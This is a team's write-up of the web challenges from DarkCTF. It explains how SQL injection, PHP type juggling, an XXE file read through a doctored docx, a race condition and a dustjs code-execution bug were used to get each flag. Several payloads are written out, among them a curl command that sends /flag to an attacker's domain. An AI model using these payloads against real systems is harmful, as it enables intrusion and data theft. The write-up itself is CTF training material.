## Writeups For all Web Challenges from DarkCTF

# Source
`496 solves / 101 points`
`Author: Mr.Ghost`

In the challenge we are given the source code for the challenge and there are a few checks we have to bypass to get the flag
ie 
```
$web = $_SERVER['HTTP_USER_AGENT'];
if (is_numeric($web)){
      if (strlen($web) < 4){
          if ($web > 10000){ echo $flag}}}
```
so for this the input has to be a number >10000 but length less than 4. We can use the exponent syntax for this
ie 9e9 which basically gives 9*(10^9)==`9000000000`

# Apache Logs
Read the log file get the url encoded text decode it convert the numbers to ascii representation

# Simple_SQL
I guess it was suppose to be sql injection but direclty going to ?id=9 gives you the flag (idor)

# So_Simple
There was a parameter ?id= which we could use to do sql injection and get the flag from the database
`http://web.darkarmy.xyz:30001/?id=0%27%20union%20select%201,group_concat(password)3%20from%20users%20--%20-`

# PHP İnformation
This was basic php code revied and solve challenge
Part 1.
        `http://php.darkarmy.xyz:7001/?darkctf=2020`
Part 2.
        Change User-Agent to `2020_the_best_year_corona`
Part 3
        `?ctf2020=WkdGeWEyTjBaaTB5TURJd0xYZGxZZz09`
Part 4
        md5 collision with type juggling 
        `?karma=240610708&2020=QNKCDZO`

# Agent-U
Get the database 
    
if we use admin:admin as credentials the user-agent seems to get inserted into the database so we can exploit the insert clause
`' or updatexml(1, concat(0x7e, (database())), 1), '','') -- -`

# Dusty Notes
This was related to the `dustjs` module exploit similar to the one on paytm which causes codeexecution due to unsafe eval
we could use the payload
`message[]=x&message[]=y'-require('child_process').exec('curl+-F+"x=\`cat+/flag\`"+<yourdomain.com>'-' `

# Chain Race
This was a lfi-ssrf-racecondition based bug 
1. read /etc/password from there you will find a reference to another service running on the machineat localhost:8080
sending a request to http://localhost:8080 we get its sourc code 
        session_start();
        include 'flag.php';

        $login_1 = 0;
        $login_2 = 0;

        if(!(isset($_GET['user']) && isset($_GET['secret']))){
            highlight_file("index.php");
            die();
        }

        $login_1 = strcmp($_GET['user'], "admin") ? 1 : 0;

        $temp_name = sha1(date("ms").@$_COOKIE['PHPSESSID']);
        session_destroy();
        if (($_GET['secret'] == "0x1337") || $_GET['user'] == "admin") {
            die("nope");
        }

        if (strcasecmp($_GET['secret'], "0x1337") == 0){
            $login_2 = 1;
        }

        file_put_contents($temp_name, "your_fake_flag");

        if ($login_1 && $login_2) {
            if (@unlink($temp_name)) {
                die("Nope");
            }
        echo $flag;
        }
        die("Nope");
We can easily bybass the starting parts using `user=Admin&secret[]=0x1337`
Everything seems fine till this part ` if (@unlink($temp_name)) ` here it basically unlinks the file it created and @unlink($temp_name) has a return value of true/1 if successful
so basically we need to make it so that unlink fails . here we can use race condition to send 2 requests simultaneously which will cause 1 file to be deleted and the other to cause an error (as no file world be present)
i wrote a simple multithreading script to send requests simultaneously to the server with the payload
`http://127.0.0.1:8080/?user=Admin&secret[]=0x1337`
and was able to get the flag

# File Reader 

This was an interesting challenge accordind to me  in the description it said something to do with xml
so we started giving xml payloads but the application only accepted pdf and docx files
the application takes the file and displays the
```
File Name :
Size:
Mimetype :
Number of pages:
```
After learning a bit more i found that .docx can be broken down further (rename the .docx to .zip). After checking we see that app.xml is responsible for showing Number of pages
so we overwrote the app.xml with our payload 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///flag.txt'> ]>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><Pages>&xxe;</Pages></Properties>```
and repackaged the zip file as .docx  and sent it to the server


# Safe_House

Another Sql challenge i started of as blind based and one of my teammates figured that error based would be much easier
`http://safehouse.darkarmy.xyz/?xer=' union select%201,2, (select updatexml(null,concat(0x0a,(%20select%20group_concat(referer)%20from referers )),0x0a))-- -`
the flag was in referers table 

### Note
All challenges were solved along with team members no challenge was a solo effor
team members 
@Az3z3l
@yadhuz
@sayooj
@c3rb3rus

